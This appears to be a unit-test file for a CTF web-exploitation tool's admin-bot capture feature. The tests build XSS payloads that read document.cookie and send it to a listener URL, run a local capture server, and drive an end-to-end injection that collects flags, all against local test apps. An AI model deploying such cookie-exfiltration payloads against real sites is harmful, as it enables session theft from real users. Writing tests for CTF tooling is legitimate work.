"""Tests for the admin-bot OOB capture / cookie-exfil feature."""
import contextlib
import io
import os
import sys
import unittest
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from webctf.browser.capture import (  # noqa: E402
    CaptureServer, build_exfil_payload, capture_and_exfil,
)
from webctf.cli import main  # noqa: E402
from fixtures.server import ServedApp  # noqa: E402
from fixtures import exfil_bot  # noqa: E402


class CaptureUnitTests(unittest.TestCase):
    def test_build_payload(self):
        p = build_exfil_payload("http://127.0.0.1:9/", tag="h1", what="cookie")
        self.assertIn("document.cookie", p)
        self.assertIn("http://127.0.0.1:9/", p)
        self.assertTrue(p.startswith("<h1"))
        custom = build_exfil_payload("http://x/", custom="<svg onload={JS}> {URL}")
        self.assertIn("http://x/", custom)
        self.assertIn("new Image()", custom)

    def test_capture_server_records(self):
        with CaptureServer("127.0.0.1", 0) as srv:
            urllib.request.urlopen(f"http://127.0.0.1:{srv.port}/?c=flag%3Dflag%7Bcap%7D", timeout=4)
            hit = srv.wait_for(4, lambda h: "flag{cap}" in h.blob())
            self.assertIsNotNone(hit)
            self.assertIn("flag{cap}", hit.blob())


class CaptureE2ETests(unittest.TestCase):
    def test_capture_and_exfil(self):
        with ServedApp(exfil_bot.make_app("flag{auto_exfil}")) as s:
            result = capture_and_exfil(
                s.url, bot_base=s.url, inject_param="html_input",
                listen_host="127.0.0.1", wait=8, timeout=6)
        self.assertEqual(result.report_status, 200)
        self.assertIn("flag{auto_exfil}", result.flags)
        self.assertTrue(result.hits)

    def test_cli_bot_capture(self):
        with ServedApp(exfil_bot.make_app("flag{cli_exfil}")) as s:
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
                code = main(["bot", "--url", s.url, "--bot-base", s.url,
                             "--inject-param", "html_input", "--capture",
                             "--listen-host", "127.0.0.1", "--wait", "8",
                             "--ack-authorized"])
            out = buf.getvalue()
        self.assertEqual(code, 0)
        self.assertIn("flag{cli_exfil}", out)
        self.assertIn("FLAG:", out)

    def test_capture_requires_bot_base(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(buf):
            code = main(["bot", "--url", "http://127.0.0.1:1/", "--capture", "--ack-authorized"])
        self.assertEqual(code, 2)
        self.assertIn("bot-base", buf.getvalue())


if __name__ == "__main__":
    unittest.main()
